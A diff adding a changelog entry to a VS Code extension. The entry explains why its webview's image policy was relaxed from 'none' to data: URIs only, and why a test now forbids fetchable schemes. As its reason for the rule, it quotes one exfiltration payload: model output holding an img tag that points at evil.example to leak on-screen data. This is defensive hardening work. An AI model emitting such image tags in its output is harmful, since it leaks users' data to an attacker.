@@ -1,5 +1,30 @@
 # light-code-vscode
 
+## 0.84.2
+
+### Patch Changes
+
+- Diagrams render in the extension: the webview blocked every image
+
+  Reported with a screenshot: the diagram entry appeared — title, note, Copy SVG — and the picture
+  itself was a broken-image glyph. The webview's content security policy said `img-src 'none'`, so
+  nothing could load at all.
+
+  That setting was there for a real reason, and it is the reason to be careful changing it: the
+  classic exfiltration trick is model output containing `<img src="https://evil.example/?d=…">`,
+  which sends whatever is on screen to whoever wrote it purely as a side effect of rendering.
+
+  It is now `img-src data:` — narrower than it sounds. **A `data:` URI makes no request**, so there
+  is nowhere for anything to be sent and the hole `'none'` was closing stays closed. Not `'self'`,
+  not `https:`, no scheme that could be fetched. An SVG loaded through `<img>` also cannot run
+  script whatever it contains, and the markup is generated in core from a validated graph with every
+  label escaped — so this is the second line of defence rather than the first.
+
+  The policy had no test of any kind, which is how one directive came to be unchangeable with
+  confidence. `webview/csp.test.ts` now pins all of it, and states the image rule as a prohibition
+  rather than a value: `img-src` may never gain `http:`, `https:`, `blob:`, `*` or `'self'`.
+  Verified by planting `https:` and watching it fail.
+
 ## 0.84.1
 
 ### Patch Changes
